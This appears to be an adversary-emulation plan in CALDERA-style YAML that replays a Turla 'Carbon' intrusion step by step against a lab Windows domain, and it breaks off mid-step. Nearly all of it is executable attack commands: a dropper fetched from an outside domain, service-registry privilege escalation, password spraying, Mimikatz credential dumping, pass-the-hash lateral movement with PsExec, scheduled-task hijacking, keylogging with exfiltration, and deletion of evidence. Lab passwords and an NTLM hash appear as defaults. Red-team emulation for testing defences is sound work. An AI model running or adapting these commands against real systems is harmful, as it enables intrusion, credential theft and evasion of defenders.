@@ -1,0 +1,1004 @@
+# turla_carbon.yaml - CALDERA Style TTPs
+
+- emulation_plan_details:
+    id: eddf38a4-e483-48ec-8874-4983c7a3652b
+    adversary_name: Turla - Carbon
+    adversary_description: Turla is a Russian-based threat group known for watering hole and spear phishing campaigns and leveraging in-house tools and malware. 
+    attack_version: 13
+    format_version: 1.0
+
+
+# Step 1 - Initial Compromise
+
+- id: 9a49d734-c69a-4a6b-b726-5a2a86edf418
+  name: RDP to 1st host (User)
+  description: |
+    Use xfreerdp to RDP into the first host. Then, wait for the login to complete.
+  tactic: x
+  technique:
+    attack_id: x 
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{first.target.user}" /p:"#{first.target.password}" /v:#{first.target.ip} /cert-ignore
+  input_arguments:
+    first.target.ip: 
+      description: The IP address of the first target host.
+      type: string
+      default: 10.20.20.102
+    first.target.user:
+      description: The username of the first target host.
+      type: string
+      default: gunter
+    first.target.password:
+      description: The password of the first target host.
+      type: string
+      default: Password1!
+    network.domain.name: 
+      description: The network domain name for initial target system.
+      type: string
+      default: skt
+      
+- id: 2c7ad0e1-d112-4c71-8deb-38bc3ce5654b
+  name: Download EPIC dropper (User)
+  description: |
+    Using xdotool, send keystrokes to download the EPIC dropper. 
+  tactic: Initial Access
+  technique:
+    attack_id: T1566.002
+    name: "Phishing: Spearphishing Link"
+  procedure_group: procedure_initial_access
+  procedure_step: 1.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f xfreerdp);
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "run";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge";
+          xdotool key --window "$rdp_window" shift+colon; 
+          xdotool type --window "$rdp_window" "http";
+          xdotool key --window "$rdp_window" shift+colon; 
+          xdotool type --window "$rdp_window" "//anto-int.com/";
+          xdotool key --window "$rdp_window" shift+N; 
+          xdotool key --window "$rdp_window" shift+T; 
+          xdotool key --window "$rdp_window" shift+F; 
+          xdotool key --window "$rdp_window" shift+V; 
+          xdotool type --window "$rdp_window" "ersion.exe";
+          xdotool key --window "$rdp_window" Return;
+          sleep 20;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Return;
+        timeout: 120
+
+- id: bb4dd7c0-c5df-4321-94ca-cb7da59b9c32
+  name: Run EPIC dropper (User)
+  description: |
+    Using xdotool, run the EPIC droppper. 
+  tactic: Execution
+  technique:
+    attack_id: T1204.002
+    name: "User Execution: Malicious File"
+  procedure_group: procedure_execution
+  procedure_step: 1.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f xfreerdp);
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "run";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" 'C';
+          xdotool key --window "$rdp_window" shift+colon;           
+          xdotool type --window "$rdp_window" '\Users\#{first.target.user}\Downloads\';
+          xdotool key --window "$rdp_window" shift+N; 
+          xdotool key --window "$rdp_window" shift+T; 
+          xdotool key --window "$rdp_window" shift+F; 
+          xdotool key --window "$rdp_window" shift+V; 
+          xdotool type --window "$rdp_window" "ersion";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool key --window "$rdp_window" R;
+          sleep 30; 
+        timeout: 180
+
+
+# Step 2 - Establish Initial Access
+ 
+- id: c4e2f189-ef8d-4073-abfb-1d3449af464b
+  name: Log out of the 1st target host (User)
+  description: |
+    Use xdotool to send keystrokes to log out of the 1st target host.
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f xfreerdp);
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          echo $rdp_window;
+          sleep 5; 
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Alt+Delete;
+          sleep 6;
+          xdotool key --window "$rdp_window" Down;
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 30;
+
+- id: 771a00b3-2b39-436d-b003-b58cacffa774
+  name: Log back in to the 1st target host (User)
+  description: |
+    Use xfreerdp to log back in to the 1st target host. Wait for login to complete. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{first.target.user}" /p:"#{first.target.password}" /v:#{first.target.ip} /cert-ignore
+
+- id: 3e20bbc1-b60a-4129-88b5-627b7b4ac17d
+  name: Open Edge to trigger 1st EPIC beacon (User)
+  description: |
+    Use xdotool to open Microsoft Edge and open a blank page. Then, wait to receive the new implant beacon. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |  
+          rdp_pid=$(pgrep -f xfreerdp);
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          echo $rdp_window;
+          sleep 5; 
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "run";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge";
+          xdotool key --window "$rdp_window" shift+colon;
+          xdotool key --window "$rdp_window" Return;
+          sleep 180;
+        timeout: 220
+
+
+# Step 3 - Discovery and Privilege Escalation
+
+- id: eb66d327-3f82-4433-8897-76cd8a46865b
+  name: Execute net group discovery commands and execute `tasklist /svc` (Adversary)
+  description: |
+    Execute net group discovery commands and execute `tasklist /svc` 
+  tactic: Discovery
+  technique:
+    attack_id: T1069.002
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 3.A.1-2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc' --task-wait-timeout 60
+
+- id: 88bb16c5-f78b-45c3-91b6-a7422cd2fb13
+  name: Reg query the ViperVPNSvc Service & verify which users can access it (Adversary)
+  description: |
+    Reg query the ViperVPNSvc Service & verify which users can access it 
+  tactic: Execution
+  technique:
+    attack_id: T1059.001
+    name: "Command and Scripting Interpreter: Powershell"
+  procedure_group: procedure_execution
+  procedure_step: 3.A.5-6
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"' --task-wait-timeout 60
+
+- id: d5e29782-72ca-45f0-b286-09525ae91d75
+  name: Modify the ViperVPN service registry key (Adversary)
+  description: |
+    Modify the ViperVPN service registry key
+  tactic: Privilege Escalation
+  technique:
+    attack_id: T1574.011
+    name: "Hijack Execution Flow: Services Registry Permissions Weakness"
+  procedure_group: procedure_privilege_escalation
+  procedure_step: 3.A.7
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f' --task-wait-timeout 60
+
+- id: 349d3879-c849-493a-989e-6d7f40015f54
+  name: RDP to 2nd host (User)
+  description: |
+    Use xfreerdp to RDP into the second host. Then, wait for the login to complete.
+  tactic: x
+  technique: 
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{second.target.user}" /p:"#{second.target.password}" /v:#{second.target.ip} /cert-ignore
+  input_arguments:
+    second.target.ip: 
+      description: The IP address of the second target host.
+      type: string
+      default: 10.20.10.9
+    second.target.user:
+      description: The username of the second target host.
+      type: string
+      default: frieda
+    second.target.password:
+      description: The password of the second target host.
+      type: string
+      default: Password3!
+
+- id: b7190a39-c5f1-4955-8923-44807d8069e7
+  name: Stop and start ViperVPNSvc Service (User)
+  description: |
+    Use xdotool to open an administrator powershell prompt on the second host. 
+    Use the administrator powershell prompt to start the ViperVPNSvc Service on the second host. Then, wait for the implant beacon. 
+  tactic: x
+  technique: 
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f #{second.target.user});
+          rdp_window=$(xdotool search --pid "$rdp_pid"); 
+
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 1;
+          xdotool type --window "$rdp_window" "powershell";
+          sleep 1;
+          xdotool key --window "$rdp_window" Shift+F10;
+          sleep 1;
+          xdotool key --window "$rdp_window" Down;
+          sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 1;
+          xdotool key --window "$rdp_window" alt+Y;  
+          sleep 2;
+          xdotool type --window "$rdp_window" "sc.exe \\\\#{first.target.host} stop ViperVPNSvc; sc.exe \\\\#{first.target.host} start ViperVPNSvc;";
+          sleep 2;
+          xdotool key --window "$rdp_window" Return;
+          sleep 250;
+        timeout: 300
+  input_arguments:
+    first.target.host: 
+      description: The hostname of the first target host.
+      type: string
+      default: hobgoblin
+
+
+# Step 4 - Persistence
+
+- id: da986326-8d71-4e85-b767-0c8ffc49a2af
+  name: Download the CARBON-DLL installer (Adversary)
+  description: |
+    Task the SYSTEM level EPIC implant to download the CARBON-DLL installer.
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 4.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe' --task-wait-timeout 60
+
+- id: d702d810-3414-4e38-8cbc-22fc429d2da4
+  name: Execute the CARBON-DLL installer (Adversary)
+  description: |
+    Task the SYSTEM level EPIC implant to execute the CARBON-DLL installer.
+  tactic: Defense Evasion
+  technique: 
+    attack_id: T1112
+    name: "Modify Registry"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 4.A.2-4.A.6
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe' --task-wait-timeout 60; 
+          sleep 180;
+        timeout: 300
+
+- id: f2462df4-2867-4d72-b3f1-ffa9a7431f87
+  name: Perform whoami discovery command (Adversary)
+  description: |
+    Task the Carbon implant to execute the whoami discovery command.
+  tactic: Discovery
+  technique:
+    attack_id: T1033
+    name: "System Owner/User Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 4.A.13
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 0, "cmd": "whoami"}' --task-wait-timeout 60
+
+
+# Step 5 - Lateral Movement to Domain Controller
+
+- id: 02772b8f-4f3b-42c6-9705-1d05b33ad19a
+  name: Open Microsoft Edge on 2nd target host (User)
+  description: |
+    Use xdotool to run Microsoft Edge and open a blank page. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f #{second.target.user});
+          rdp_window=$(xdotool search --pid "$rdp_pid"); 
+
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "run";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge";
+          xdotool key --window "$rdp_window" shift+colon;
+          xdotool key --window "$rdp_window" Return;
+
+- id: 99748bd2-530e-47b6-b6d7-576d4f573b6d
+  name: Password Spray (Adversary)
+  description: |
+    Task CARBON-DLL to download and execute the batch script to spray weak passwords against the domain admin accounts and attempt to mount the C$ drive of the DC.
+  tactic: Credential Access
+  technique:
+    attack_id: T1110.003
+    name: "Brute Force: Password Spraying"
+  procedure_group: procedure_credential_access
+  procedure_step: 5.A.2-3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515  '{"id": 1, "payload": "password_spray.bat", "payload_dest": "C:\\Windows\\Temp\\winsas64.bat", "cmd": "C:\\Windows\\Temp\\winsas64.bat"}' --task-wait-timeout 300 | grep 'SUCCESS'
+        timeout: 300
+        
+- id: 4945a1e5-75ab-4665-8441-6995105edf38
+  name: Remove password spray script (Adversary)
+  description: |
+    Task CARBON-DLL to remove the password spray script  
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 5.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515  '{"id": 2, "cmd": "del /Q C:\\Windows\\Temp\\winsas64.bat"}' --task-wait-timeout 60
+
+- id: 386b614d-7237-4d1a-a6dd-543f6f515bd4
+  name: Download second CARBON-DLL (Adversary)
+  description: |
+     Task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the System32 folder on the DC via the mounted drive.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  procedure_group: 
+  procedure_step: 5.A.5-6
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 3, "payload": "carbon_installer_2.exe", "payload_dest": "C:\\Windows\\Temp\\wmimetricsq.exe", "cmd": "move C:\\Windows\\Temp\\wmimetricsq.exe \\\\#{second.target.host}\\C$\\Windows\\System32"}' --task-wait-timeout 60
+  input_arguments:
+    second.target.host: 
+      description: The hostname of the second target host.
+      type: string
+      default: bannik
+
+- id: 954ee411-8443-41f9-9a0c-f8ac032b68e7
+  name: Enumerate remote scheduled tasks (Adversary)
+  description: |
+    Task CARBON-DLL to enumerate remote scheduled tasks on the domain controller, using the discovered password for the domain admin  
+  tactic: Execution
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  procedure_group: procedure_execution
+  procedure_step: 5.A.7
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 4, "cmd": "schtasks /query /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password}"}' --task-wait-timeout 60
+
+- id: c90bbb6c-f9bd-4811-b7b7-c923902a8bde
+  name: Modify remote scheduled task (Adversary)
+  description: |
+    Task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain admin
+  tactic: Persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  procedure_group: procedure_persistence
+  procedure_step: 5.A.7
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 5, "cmd": "schtasks /Change /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /TR %SystemRoot%\\System32\\wmimetricsq.exe"}' --task-wait-timeout 60
+
+- id: a2621060-73a5-461b-918d-88a86f83c21b
+  name: Execute modified scheduled task (Adversary)
+  description: |
+     Task CARBON-DLL to remotely start the modified scheduled task on the domain controller
+  tactic: Privilege Escalation
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  procedure_group: procedure_privilege_escalation
+  procedure_step: 5.A.7
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 9b5ef515 '{"id": 6, "cmd": "schtasks /Run /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /I"}' --task-wait-timeout 300; 
+          sleep 180;
+        timeout: 300
+
+- id: bf90a64c-5367-4de6-93b5-a718189803c3
+  name: Discovery on domain controller (Adversary)
+  description: |
+    Task the new CARBON-DLL implant with discovery commands to be run on the domain controller.  
+  tactic: Discovery
+  technique:
+    attack_id: T1069.002
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.9
+  platforms:
+    linux:
+      sh:
+        command: |
+          output=$(./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 0, "cmd": "net group /domain"}' --task-wait-timeout 60);
+          echo $output | grep 'Web Servers' -i && echo $output | grep 'Web Server Admins' -i;
+
+- id: 4e39b630-f2d7-405e-a4ef-d11cf79db1be
+  name: Enumerate groups (Adversary)
+  description: |
+    Task CARBON-DLL to enumerate both groups for their members
+  tactic: Discovery
+  technique:
+    attack_id: T1069.002
+    name: "Permission Groups Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.9
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 1, "cmd": "net group \"Web Servers\" /domain && net group \"Web Server Admins\" /domain"}' --task-wait-timeout 60;
+
+- id: 4e31798e-f973-4480-aa38-3372c44c29c9
+  name: Enumerate Active Directory Computers (Adversary)
+  description: |
+    Task CARBON-DLL to enumerate the Active Directory Computers
+  tactic: Discovery
+  technique:
+    attack_id: T1018 
+    name: "Remote System Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.10
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 2, "cmd": "dsquery * -filter \"(&(objectclass=computer))\" -attr *"}' --task-wait-timeout 60 | grep -i '#{third.target.user} Workstation'
+  input_arguments:
+    third.target.user:
+      description: The username of the third target host.
+      type: string
+      default: adalwolfa
+
+
+# Step 6 - Preparation for Lateral Movement onto Second Host
+
+- id: 33d4136a-d5e6-45f2-b0e1-786d3ec8bf02
+  name: Mimikatz lsadump (Adversary)
+  description: |
+     Task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump
+  tactic: Credential Access
+  technique: 
+    attack_id: T1003
+    name: "OS Credential Dumping"
+  procedure_group: procedure_credential_access
+  procedure_step: 6.A.1-3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 3, "payload": "DvKGMmGn.exe", "payload_dest": "C:\\Windows\\Temp\\terabox.exe", "cmd": "move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe && C:\\Windows\\System32\\terabox.exe \"lsdu::go /ynot\" \"quit\""}' --task-wait-timeout 60
+
+
+# Step 7 - Lateral Movement to Second Workstation
+
+- id: 9b50feb8-41a2-489a-a863-75240743734c
+  name: RDP to 3rd host (User)
+  description: |
+    Use xfreerdp to RDP into the third host. Then, wait for the login to complete.
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{third.target.user}" /p:"#{third.target.password}" /v:#{third.target.ip} /cert-ignore
+  input_arguments:
+    third.target.ip: 
+      description: The IP address of the third target host.
+      type: string
+      default: 10.20.20.104
+    third.target.password:
+      description: The password of the third target host.
+      type: string
+      default: Password2!
+
+- id: f6690cfd-073d-49c4-bd1b-1194aeb26780
+  name: Open Microsoft Edge (User)
+  description: |
+    Use xdotool to run Microsoft Edge and open a blank page. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f #{third.target.user});
+          rdp_window=$(xdotool search --pid "$rdp_pid"); 
+          sleep 6;
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          sleep 6;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "run";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge";
+          xdotool key --window "$rdp_window" shift+colon;
+          xdotool key --window "$rdp_window" Return;
+
+- id: f9ad6b77-518e-4784-9fba-5e4cd97fc455
+  name: Download PsExec (Adversary)
+  description: |
+    Task the CARBON-DLL implant on the domain controller to download PsExec.
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress tool transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 7.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 4, "payload": "PsExec.exe", "payload_dest": "C:\\Windows\\Temp\\tmp5712.tmp", "cmd": "move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe && dir C:\\Windows\\System32\\wsqsp.exe"}' --task-wait-timeout 60
+
+- id: 75424a6a-28f5-46fa-834b-508f7d09020a
+  name: Download third CARBON-DLL (Adversary)
+  description: |
+    Task the CARBON-DLL implant on the domain controller to download a third copy of the CARBON-DLL installer.
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress tool transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 7.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 5, "payload": "carbon_installer_3.exe", "payload_dest": "C:\\Windows\\Temp\\tmp1283.tmp", "cmd": "move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe && dir C:\\Windows\\System32\\wsqmanager.exe"}' --task-wait-timeout 60
+
+- id: 824d5eda-7743-4c10-89d8-143d4bc50eda
+  name: Copy installer & execute using PsExec (Adversary)
+  description: |
+    Task the CARBON-DLL implant on the domain controller to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the installer to Adalwolfa's workstation and (2) execute it using PsExec.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1550.002
+    name: "Use Alternate Authentication Material: Pass the Hash"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 7.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 6, "cmd": "C:\\Windows\\System32\\terabox.exe \"pr::d\" \"slsa::htp /user:#{third.target.user} /domain:#{network.domain.name} /ntlm:#{third.target.ntlm} /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\" \"quit\""}' --task-wait-timeout 60
+  input_arguments:
+    third.target.ntlm: 
+      description: The NTLM hash for the third target user.
+      type: string
+      default: 07d128430a6338f8d537f6b3ae1dc136
+    third.target.host:
+      description: The hostname of the third target host.
+      type: string
+      default: khabibulin 
+
+- id: e7c827d6-57f8-40d0-b3a9-e03b2e4d0484
+  name: Clean dropped files (Adversary)
+  description: |
+    Task the CARBON-DLL implant on the domain controller to clean up dropped files.
+  tactic: Defense Evasion
+  technique:
+    attack_id: 7.A.5
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: T1070.004
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task a3e63922 '{"id": 7, "cmd": "del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe"}' --task-wait-timeout 60
+    
+
+# Step 8 - Credential Access on Admin Host
+
+- id: 1a9e352f-4edb-480d-b29c-66acb6c4df19
+  name: Download and execute keylogger (Adversary)
+  description: |
+    Task the CARBON-DLL on Adalwolfa's workstation to download and execute the keylogger binary in the background.
+  tactic: Collection 
+  technique:
+    attack_id: 8.A.2
+    name: "Input Capture: Keylogging"
+  procedure_group: procedure_collection
+  procedure_step: T1056.001
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 0, "payload": "keylogger.exe", "payload_dest": "C:\\Windows\\Temp\\wingtsvcupdt.exe", "cmd": "C:\\Windows\\Temp\\wingtsvcupdt.exe -r"}' --task-wait-timeout 60
+
+- id: 4cedd0ef-c802-431d-a4a1-eaf1163543f3
+  name: Adalwolfa types keylogged data (User)
+  description: |
+    Xdotools will open powershell on the third target, ssh into the Apache server, type password, and exit ssh session.
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(pgrep -f #{third.target.user});
+          rdp_window=$(xdotool search --pid "$rdp_pid"); 
+
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 5;
+          xdotool type --window "$rdp_window" "powershell";
+          sleep 5;
+          xdotool key --window "$rdp_window" Return;
+          sleep 5;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 5;
+
+          xdotool type --window "$rdp_window" 'ssh #{third.target.user}@#{apache.server.ip}';
+          sleep 5;
+          xdotool key --window "$rdp_window" Return;
+          sleep 5; 
+          xdotool type --window "$rdp_window" 'yes';
+          sleep 5;
+          xdotool key --window "$rdp_window" Return;
+          sleep 5;
+          xdotool key --window "$rdp_window" Shift+P;
+          xdotool type --window "$rdp_window" 'assword2';
+          xdotool key --window "$rdp_window" Shift+1;
+          xdotool key --window "$rdp_window" Return;
+          xdotool type --window "$rdp_window" 'exit';
+          xdotool key --window "$rdp_window" Return;
+          sleep 10;
+  input_arguments:
+    apache.server.ip: 
+      description: The IP address of the Apache server.
+      type: string
+      default: 10.20.10.23
+
+- id: cefe85b8-d1e5-4077-afac-81a6622f4c66
+  name: Kill keylogger process (Adversary)
+  description: |
+    Task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process.
+  tactic: Collection 
+  technique:
+    attack_id: 8.A.2
+    name: "Input Capture: Keylogging"
+  procedure_group: procedure_collection
+  procedure_step: T1056.001
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 1, "cmd": "taskkill /IM wingtsvcupdt.exe /F"}' --task-wait-timeout 60
+
+- id: 438939c8-e95a-4fbd-b659-06f0b0b72e47
+  name: Exfiltrate keylogged data (Adversary)
+  description: |
+    Task the CARBON-DLL implant to exfiltrate the data written to the keylogger file
+  tactic: Collection 
+  technique:
+    attack_id: 8.A.2
+    name: "Input Capture: Keylogging"
+  procedure_group: procedure_collection
+  procedure_step: T1056.001
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 2, "cmd": "type %temp%\\~DFA512.tmp"}' --task-wait-timeout 200
+        timeout: 200
+
+- id: f8ab9b59-89a7-4c25-90bf-0c2485785a36
+  name: Remove keylogging evidence (Adversary)
+  description: |
+    Task the CARBON-DLL implant to remove the keylogger and keylogger output file.
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 8.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 3, "cmd": "del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp"}' --task-wait-timeout 60
+
+
+# Step 9 - Lateral Movement to Linux Server
+
+- id: 4d5197fa-4ba7-4bfd-9c91-1697ce0a80a4
+  name: Download Penquin (Adversary)
+  description: |
+    Task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp).
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 9.A.1 
+  platforms:
+    linux:
+      sh:
+        command: |
